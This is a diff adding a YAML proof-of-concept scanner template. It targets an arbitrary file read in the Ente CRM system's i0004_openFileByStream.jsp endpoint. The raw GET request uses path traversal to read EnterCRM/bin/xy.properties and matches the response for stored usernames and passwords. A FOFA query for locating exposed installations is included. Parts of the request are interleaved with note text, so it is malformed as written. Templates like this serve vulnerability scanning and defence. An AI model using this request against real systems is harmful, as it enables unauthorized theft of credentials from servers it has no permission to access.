@@ -1,0 +1,40 @@
+id: poc-ss98hdhxb5exglp6
+info:
+  name: 浙大恩特客户资源管理系统Ri0004_openFileByStream.jsp接口 任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ss98hdhxb5exglp6'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ss98hdhxb5exglp6
+    fofa: app="浙大恩特客户资源管理系统"
+http:
+- raw:
+  - 'GET /entsoft/module/i0004_openFileByStream.jsp?filepath=/../EnterCRM/bin/xy.properties&filename=conan HTTP/1.1
+
+
+    Accept: */*
+
+
+    Connection: Keep-Alive
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?enter.user)(?=.*?enter.password).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
